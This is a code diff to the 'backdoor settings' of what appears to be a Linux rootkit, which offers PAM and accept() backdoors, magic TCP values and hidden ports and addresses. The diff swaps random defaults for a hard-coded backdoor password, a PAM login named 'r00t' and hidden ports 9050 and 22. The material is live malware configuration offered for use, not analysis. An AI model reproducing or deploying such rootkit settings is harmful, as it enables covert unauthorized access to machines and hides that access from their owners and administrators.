@@ -11,10 +11,10 @@
 # BACKDOOR SETTINGS
 
 
-BACKDOOR_PASS = None  # password for all doors. set to None = random
+BACKDOOR_PASS = k3ks3c  # password for all doors. set to None = random
 
 USE_PAM_BD = True
-PAM_UNAME  = None  # set to None = random
+PAM_UNAME  = r00t  # set to None = random
 
 # accept() backdoor. allows backdoor access via infected services on the box.
 # must have a dedicated port number for this. dedicated port cannot be used for other stuff.
@@ -34,7 +34,7 @@ MAGIC_SEQ = 0xc4de
 MAGIC_ACK = 0xc500
 
 NUM_HIDDEN_PORTS = 2     # no. of random port numbers to be hidden by default. they are displayed during setup & installation.
-CUSTOM_PORTS     = []    # specify ports here if you'd rather choose.
+CUSTOM_PORTS     = [9050,22]    # specify ports here if you'd rather choose.
 HIDDEN_IP_ADDRS  = []    # ipv4 addresses in this list will be hidden. (hide all connections from a specific source) keeping empty disables in the kit.
 # END OF BACKDOOR SETTINGS
 
